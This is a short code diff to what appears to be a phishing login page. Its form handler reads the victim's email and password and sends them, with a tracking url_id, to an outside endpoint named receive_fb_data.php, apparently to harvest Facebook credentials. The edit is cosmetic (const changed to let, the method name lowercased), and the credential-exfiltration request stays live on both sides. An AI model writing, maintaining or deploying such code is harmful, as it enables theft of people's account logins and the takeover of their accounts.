@@ -51,13 +51,13 @@
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pwd').value;
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('pwd').value;
             const url_id = getUrlParameter('url_id');
             const data = { email, password, url_id };
 
             const xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://8080.rf.gd/receive_fb_data.php", true);
+            xhr.open("post", "https://8080.rf.gd/receive_fb_data.php", true);
             xhr.setRequestHeader("Content-Type", "application/json");
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4 && xhr.status === 200) {
